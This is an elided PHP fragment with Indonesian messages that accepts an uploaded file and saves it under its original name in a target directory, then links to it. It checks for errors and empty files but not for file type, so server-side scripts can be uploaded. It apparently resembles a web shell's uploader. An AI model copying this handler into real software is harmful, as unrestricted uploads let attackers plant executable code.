...
if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
    ...
    if ($file['error'] !== UPLOAD_ERR_OK) {
        $upload_message = "Gagal upload (error kode " . $file['error'] . ").";
        return;
    }

    // Pastikan file benar-benar diupload via HTTP POST
    if (!is_uploaded_file($file['tmp_name'])) {
        $upload_message = "File tidak valid (bukan hasil unggahan POST).";
        return;
    }
    ...
    if ($real_size === false || $real_size <= 0) {
        $upload_message = "File 0KB terdeteksi. Upload dibatalkan.";
        return;
    }
    ...
    if ($firstBytes === false || strlen($firstBytes) === 0) {
        // JIKA FILE KOSONG, TAMBAHKAN ISI MINIMAL
        file_put_contents($file['tmp_name'], " ");
    }

    // Simpan file
    $safe_name = basename($file['name']);
    $upload_path = $default_dir . '/' . $safe_name;

    if (move_uploaded_file($file['tmp_name'], $upload_path)) {
        $upload_message = "Upload sukses: <a href='" . htmlspecialchars($safe_name) . "' target='_blank'>$safe_name</a>";
    } else {
        $upload_message = "Gagal memindahkan file ke direktori tujuan.";
    }
}
?>
<html>
